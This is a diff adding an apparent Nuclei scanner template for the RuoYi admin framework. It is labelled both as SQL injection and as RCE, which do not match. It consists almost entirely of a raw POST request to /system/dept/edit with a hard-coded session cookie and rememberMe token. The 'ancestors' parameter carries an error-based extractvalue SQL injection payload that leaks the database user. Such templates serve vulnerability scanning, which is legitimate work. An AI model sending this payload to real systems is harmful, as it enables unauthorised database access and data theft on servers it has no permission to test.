@@ -1,0 +1,39 @@
+id: ruoyi-list-sqli
+info:
+  name: ruoyi-getNames-rce
+  author: ro1t
+  severity: high
+  metadata:
+    fofa-qeury: app=""
+  tags: ruoyi
+
+http:
+  - raw:
+      - |
+        POST /system/dept/edit HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 231
+        sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        sec-ch-ua-mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+        sec-ch-ua-platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=6d01744f-6049-4e6f-95bc-f75fe586f8fb; rememberMe=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
+        Connection: close
+
+        deptId=100&parentId=0&parentName=%E6%97%A0&deptName=%E8%8B%A5%E4%BE%9D%E7%A7%91%E6%8A%801&orderNum=0&leader=%E8%8B%A5%E4%BE%9D&phone=15888888888&email=ry%40qq.com&status=0&ancestors=0)or(extractvalue(1,concat(0,(select+user()))));#
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Error updating database"
+          - "XPATH"
+
